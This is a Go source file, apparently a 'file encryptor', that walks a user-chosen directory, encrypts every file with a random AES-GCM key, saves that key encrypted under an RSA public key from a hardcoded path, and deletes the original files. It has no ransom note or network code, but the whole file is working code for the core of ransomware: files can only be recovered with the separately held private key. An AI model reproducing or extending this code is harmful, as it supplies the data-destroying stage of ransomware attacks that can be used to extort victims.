package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"
)

func ImportPublicKey(filename string) (*rsa.PublicKey, error) {
	fileContents, err := os.ReadFile(filename)
	if err != nil {
		panic(err.Error())
	}

	block, _ := pem.Decode(fileContents)
	pubKeyIface, _ := x509.ParsePKIXPublicKey(block.Bytes)
	return pubKeyIface.(*rsa.PublicKey), nil
}

func main() {
	timeStarted := time.Now()
	noOfFilesEncrypted := 0
	var targetpath string
	fmt.Print("Enter the target path without Spaces: ")
	fmt.Scanln(&targetpath)

	pubKey, err := ImportPublicKey("/home/freligion/file_encryptor/rsapub.pem")
	if err != nil {
		panic(err)
	}

	aesKey := make([]byte, 32)
	rand.Read(aesKey)

	encryptedKey, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, aesKey, nil)
	os.WriteFile("../aes_key.enc", encryptedKey, 0644)

	block, _ := aes.NewCipher(aesKey)

	gcm, _ := cipher.NewGCM(block)

	// looping through target files
	filepath.Walk(targetpath, func(path string, info os.FileInfo, err error) error {
		// skip directories
		if !info.IsDir() {
			// encrypt the file
			fmt.Println("Encrypting ", path, "...")

			//read file contents
			original, err := os.ReadFile(path)
			if err != nil {
				panic(err)
			} else {
				// encrypt the contents
				nonce := make([]byte, gcm.NonceSize())
				io.ReadFull(rand.Reader, nonce)
				encrypted := gcm.Seal(nonce, nonce, original, nil)
				noOfFilesEncrypted ++
				// write new encrypted files
				err = os.WriteFile(path+".enc", encrypted, 0666)

				// remove original files
				if err == nil {
					os.Remove(path)
				} else {
					fmt.Println("Error while writing encryted files.")
				}
			}
		}
		return nil
	})
	fmt.Println("It took ", time.Since(timeStarted))
	fmt.Println("No of files Encrypted: ", noOfFilesEncrypted)
	fmt.Println("\n Encrypted Files Successfully.")
}
